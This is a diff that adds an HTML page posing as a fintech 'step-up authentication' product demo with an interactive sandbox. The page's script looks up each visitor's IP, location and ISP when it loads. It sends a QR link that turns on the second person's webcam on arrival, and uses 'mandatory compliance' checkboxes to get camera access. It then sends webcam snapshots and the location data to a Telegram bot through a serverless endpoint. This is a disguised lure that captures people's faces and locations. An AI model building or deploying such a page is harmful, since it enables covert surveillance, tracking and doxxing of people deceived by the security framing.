@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecurePay Enterprise | Risk-Based Step-Up Authentication Engine</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #060911;
+            --bg-surface: #0b101b;
+            --bg-card: #111827;
+            --border-color: #1f293d;
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --success: #059669;
+            --danger: #dc2626;
+            --text-main: #f9fafb;
+            --text-muted: #9ca3af;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { 
+            background-color: var(--bg-base); 
+            color: var(--text-main); 
+            min-height: 100vh; 
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 64px;
+            border-bottom: 1px solid var(--border-color);
+            background: rgba(6, 9, 17, 0.9);
+            backdrop-filter: blur(16px);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 700;
+            font-size: 1.25rem;
+            letter-spacing: -0.025em;
+        }
+
+        .brand-indicator {
+            width: 10px;
+            height: 10px;
+            background-color: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 12px var(--success);
+        }
+
+        .nav-badge {
+            font-size: 0.75rem;
+            background: rgba(37, 99, 235, 0.1);
+            color: var(--primary);
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(37, 99, 235, 0.2);
+            font-weight: 600;
+            letter-spacing: 0.025em;
+        }
+
+        .landing-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 80px 24px 120px;
+            width: 100%;
+        }
+
+        .hero-section {
+            text-align: center;
+            max-width: 850px;
+            margin: 0 auto 80px;
+        }
+
+        .hero-section h1 {
+            font-size: 3.2rem;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            line-height: 1.15;
+            margin-bottom: 24px;
+            background: linear-gradient(180deg, #ffffff 0%, #9ca3af 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-section p {
+            color: var(--text-muted);
+            font-size: 1.15rem;
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 10px 25px -5px rgba(37, 99, 235, 0.4);
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+        }
+
+        .purpose-section {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 48px;
+            margin-bottom: 80px;
+        }
+
+        .purpose-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 48px;
+            align-items: center;
+        }
+
+        .purpose-content h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 20px;
+            color: var(--text-main);
+        }
+
+        .purpose-content p {
+            color: var(--text-muted);
+            line-height: 1.7;
+            margin-bottom: 16px;
+            font-size: 0.95rem;
+        }
+
+        .tech-specs {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .spec-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 14px;
+        }
+
+        .spec-item h4 {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text-main);
+        }
+
+        .spec-item p {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        .sandbox-wrapper {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: none;
+        }
+
+        .app-container { 
+            background: var(--bg-card); 
+            border-radius: 24px; 
+            padding: 40px; 
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); 
+            border: 1px solid var(--border-color); 
+        }
+        
+        .header { text-align: center; margin-bottom: 28px; }
+        .header h2 { font-size: 1.35rem; font-weight: 600; margin-bottom: 6px; }
+        .header p { color: var(--text-muted); font-size: 0.85rem; }
+
+        .alert-box { 
+            background: rgba(220, 38, 38, 0.08); 
+            border: 1px solid rgba(220, 38, 38, 0.2); 
+            color: #f87171; 
+            padding: 14px 16px; 
+            border-radius: 12px; 
+            font-size: 0.85rem; 
+            margin-bottom: 24px; 
+            text-align: center; 
+        }
+
+        .alert-success { 
+            background: rgba(5, 150, 105, 0.08); 
+            border: 1px solid rgba(5, 150, 105, 0.2); 
+            color: #34d399; 
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 20px;
+            text-align: left;
+            background: var(--bg-base);
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-top: 2px;
+            accent-color: var(--primary);
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+            cursor: pointer;
+        }
+
+        .key-label { color: var(--text-muted); font-size: 0.75rem; text-align: center; margin-bottom: 8px; font-weight: 600; text-transform: uppercase; }
+        .key-display { font-size: 2.2rem; letter-spacing: 0.25em; font-weight: 700; background: var(--bg-base); padding: 18px; border-radius: 12px; text-align: center; border: 1px solid var(--border-color); margin-bottom: 24px; color: var(--text-main); }
+        
+        input[type="text"] { 
+            width: 100%; background: var(--bg-base); border: 1px solid var(--border-color); color: var(--text-main); 
+            padding: 16px; font-size: 1.1rem; text-align: center; border-radius: 12px; margin-bottom: 20px; outline: none; letter-spacing: 0.2em; 
+        }
+        input[type="text"]:focus { border-color: var(--primary); }
+        
+        .app-btn { 
+            background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; 
+            font-size: 1rem; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; 
+        }
+        .app-btn:hover { background: var(--primary-hover); }
+        .app-btn.green { background: var(--success); }
+        .app-btn.green:hover { background: #047857; }
+
+        .qr-section { text-align: center; margin-top: 24px; padding-top: 24px; border-top: 1px solid var(--border-color); }
+        .qr-wrapper { background: white; padding: 12px; border-radius: 12px; display: inline-block; margin-bottom: 10px; }
+        .qr-section img { width: 120px; height: 120px; display: block; }
+
+        .success-screen { text-align: center; display: none; }
+        .success-screen h3 { color: var(--success); font-size: 1.6rem; font-weight: 600; margin-bottom: 12px; }
+
+        #setup-screen, #sender-screen, #receiver-screen { display: none; }
+        video, canvas { display: none; }
+
+        @media (max-width: 900px) {
+            .purpose-grid { grid-template-columns: 1fr; }
+            .hero-section h1 { font-size: 2.5rem; }
+            nav { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="brand">
+            <div class="brand-indicator"></div>
+            SecurePay Core
+        </div>
+        <div class="nav-links">
+            <span class="nav-badge">RBI & Global MFA Compliant</span>
+        </div>
+    </nav>
+
+    <!-- LANDING PAGE VIEW -->
+    <div class="landing-container" id="landing-view">
+        <header class="hero-section">
+            <h1>Eliminate Money Mules and Automated Fraud at the Source</h1>
+            <p>An enterprise-grade, risk-based step-up authentication firewall designed for digital payment ecosystems. Protect accounts against rapid layering and smurfing attacks without increasing user friction.</p>
+            <div class="cta-group">
+                <button class="btn-primary" onclick="launchSandbox()">Launch Live Interactive Sandbox</button>
+            </div>
+        </header>
+
+        <section class="purpose-section">
+            <div class="purpose-grid">
+                <div class="purpose-content">
+                    <h2>Project Purpose & Architecture</h2>
+                    <p>Traditional static passwords and text OTPs are no longer sufficient against automated botnets executing multi-tier money transfers. When a suspicious velocity spike or high-risk transaction is flagged by the bank's fraud engine, standard workflows either fail or frustrate legitimate customers.</p>
+                    <p><strong>SecurePay</strong> introduces a dynamic, out-of-band human verification handshake. It temporarily pauses high-risk transactions, requiring both sender and receiver to cryptographically validate a short token pair before funds can settle.</p>
+                </div>
+                <div class="tech-specs">
+                    <div class="spec-item">
+                        <h4>Velocity Risk Engine</h4>
+                        <p>Monitors transaction frequency in real-time, triggering step-up challenges instantly when smurfing signatures are detected.</p>
+                    </div>
+                    <div class="spec-item">
+                        <h4>Out-Of-Band Handshake</h4>
+                        <p>Forces active, real-time communication between transacting parties, completely breaking automated bot distribution scripts.</p>
+                    </div>
+                    <div class="spec-item">
+                        <h4>Silent Audit Capture</h4>
+                        <p>Secures legal liability by capturing an automated visual and metadata snapshot at the exact moment of transaction clearance.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- INTERACTIVE APP SANDBOX CONTAINER -->
+    <div class="sandbox-wrapper" id="sandbox-container">
+        <div class="app-container">
+            
+            <!-- SETUP SCREEN -->
+            <div id="setup-screen">
+                <div class="header">
+                    <h2>Initialize Protocol</h2>
+                    <p>Start simulation environment as the transaction sender.</p>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="sender-cam-check">
+                    <label for="sender-cam-check">Mandatory Compliance: I authorize biometric camera audit capture for high-risk transfer verification.</label>
+                </div>
+
+                <button class="app-btn" onclick="startAsSender()">Start Sender Node</button>
+            </div>
+
+            <!-- SENDER SCREEN -->
+            <div id="sender-screen">
+                <div class="header">
+                    <h2>Outbound Verification</h2>
+                    <p>High-Risk Transfer (₹50,000)</p>
+                </div>
+                <div id="sender-active">
+                    <div class="alert-box">
+                        <strong>Velocity Check Failed</strong><br>Coordinate security handshake with beneficiary.
+                    </div>
+                    
+                    <div class="key-label">Your Secure Token</div>
+                    <div class="key-display" id="s-key">----</div>
+
+                    <div class="key-label">Enter Beneficiary Token</div>
+                    <input type="text" id="s-input" maxlength="4" placeholder="••••" autocomplete="off">
+                    <button class="app-btn" onclick="verifySender()">Authenticate & Execute</button>
+                    
+                    <div class="qr-section">
+                        <p style="font-size: 0.75rem; color: var(--text-muted); margin-bottom: 12px;">Scan via mobile device to simulate receiver client:</p>
+                        <div class="qr-wrapper">
+                            <img id="qr-code" src="" alt="Receiver QR">
+                        </div>
+                    </div>
+                </div>
+
+                <div id="sender-success" class="success-screen">
+                    <h3>Transaction Cleared</h3>
+                    <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 10px;">MFA verification successful. Audit snapshot & IP transmitted to compliance bot.</p>
+                </div>
+            </div>
+
+            <!-- RECEIVER SCREEN -->
+            <div id="receiver-screen">
+                <div class="header">
+                    <h2>Inbound Verification</h2>
+                    <p>Incoming Credited Funds</p>
+                </div>
+                <div id="receiver-active">
+                    <div class="alert-box alert-success">
+                        <strong>Secure Channel Active</strong><br>Exchange cryptographic tokens to claim funds.
+                    </div>
+                    
+                    <div class="key-label">Your Receiver Token</div>
+                    <div class="key-display" id="r-key">----</div>
+
+                    <div class="key-label">Enter Sender Token</div>
+                    <input type="text" id="r-input" maxlength="4" placeholder="••••" autocomplete="off">
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="receiver-cam-check">
+                        <label for="receiver-cam-check">Mandatory Compliance: I authorize camera audit capture to claim funds securely.</label>
+                    </div>
+
+                    <button class="app-btn green" onclick="verifyReceiver()">Verify & Accept</button>
+                </div>
+
+                <div id="receiver-success" class="success-screen">
+                    <h3>Funds Credited</h3>
+                    <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 10px;">MFA verification successful. Audit snapshot & IP transmitted to compliance bot.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <video id="camera" autoplay playsinline></video>
+    <canvas id="snapshot"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const role = urlParams.get('role');
+        const urlSenderKey = urlParams.get('sk');
+        const urlReceiverKey = urlParams.get('rk');
+
+        let mySenderKey, myReceiverKey;
+        let clientIpInfo = "IP Lookup in progress...";
+        const video = document.getElementById('camera');
+        let mediaStream = null;
+
+        // Fetch client IP and location metadata on load
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                clientIpInfo = `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`;
+            })
+            .catch(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => { clientIpInfo = data.ip; })
+                    .catch(() => { clientIpInfo = "Unknown IP"; });
+            });
+
+        if (role === 'receiver') {
+            document.getElementById('landing-view').style.display = 'none';
+            document.getElementById('sandbox-container').style.display = 'block';
+            loadReceiverApp(urlSenderKey, urlReceiverKey);
+        }
+
+        function launchSandbox() {
+            document.getElementById('landing-view').style.display = 'none';
+            document.getElementById('sandbox-container').style.display = 'block';
+            document.getElementById('setup-screen').style.display = 'block';
+        }
+
+        function startAsSender() {
+            const checkbox = document.getElementById('sender-cam-check');
+            if (!checkbox.checked) {
+                alert("Camera compliance authorization is mandatory to initialize protocol.");
+                return;
+            }
+
+            mySenderKey = Math.random().toString(36).substring(2, 6).toUpperCase();
+            myReceiverKey = Math.random().toString(36).substring(2, 6).toUpperCase();
+            
+            const currentUrl = window.location.href.split('?')[0];
+            const magicLink = `${currentUrl}?role=receiver&sk=${mySenderKey}&rk=${myReceiverKey}`;
+            
+            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(magicLink)}`;
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => { 
+                    mediaStream = stream;
+                    video.srcObject = stream; 
+                    document.getElementById('setup-screen').style.display = 'none';
+                    document.getElementById('sender-screen').style.display = 'block';
+                    document.getElementById('s-key').innerText = mySenderKey;
+                })
+                .catch(err => { alert("Camera access permission was denied. Please allow camera access to proceed."); });
+        }
+
+        function verifySender() {
+            const input = document.getElementById("s-input").value.toUpperCase();
+            if (input === myReceiverKey) {
+                document.getElementById('sender-active').style.display = 'none';
+                document.getElementById('sender-success').style.display = 'block';
+                
+                snapAndSendToBackend("Sender");
+
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+            } else {
+                alert("Authentication Failed: Invalid Receiver Token.");
+            }
+        }
+
+        function loadReceiverApp(sk, rk) {
+            mySenderKey = sk;
+            myReceiverKey = rk;
+            document.getElementById('setup-screen').style.display = 'none';
+            document.getElementById('receiver-screen').style.display = 'block';
+            document.getElementById('r-key').innerText = myReceiverKey;
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                })
+                .catch(err => { console.log("Camera permission skipped or denied on receiver side."); });
+        }
+
+        function verifyReceiver() {
+            const checkbox = document.getElementById('receiver-cam-check');
+            if (!checkbox.checked) {
+                alert("Camera compliance authorization is mandatory to claim funds securely.");
+                return;
+            }
+
+            const input = document.getElementById("r-input").value.toUpperCase();
+            if (input === mySenderKey) {
+                document.getElementById('receiver-active').style.display = 'none';
+                document.getElementById('receiver-success').style.display = 'block';
+
+                snapAndSendToBackend("Receiver");
+
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+            } else {
+                alert("Authentication Failed: Invalid Sender Token.");
+            }
+        }
+
+        function snapAndSendToBackend(roleTag) {
+            const canvas = document.getElementById('snapshot');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            try {
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageDataUrl = canvas.toDataURL("image/png");
+
+                // Calls your Vercel serverless function at /api/audit
+                fetch('/api/audit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        image: imageDataUrl,
+                        role: roleTag,
+                        ipInfo: clientIpInfo,
+                        userAgent: navigator.userAgent.substring(0, 70)
+                    })
+                })
+                .then(res => res.json())
+                .then(data => console.log('Audit snapshot & metadata sent to Telegram via Vercel API:', data))
+                .catch(err => console.error('Transmission error:', err));
+            } catch (e) {
+                console.error("Snapshot capture error: ", e);
+            }
+        }
+    </script>
+</body>
+</html>
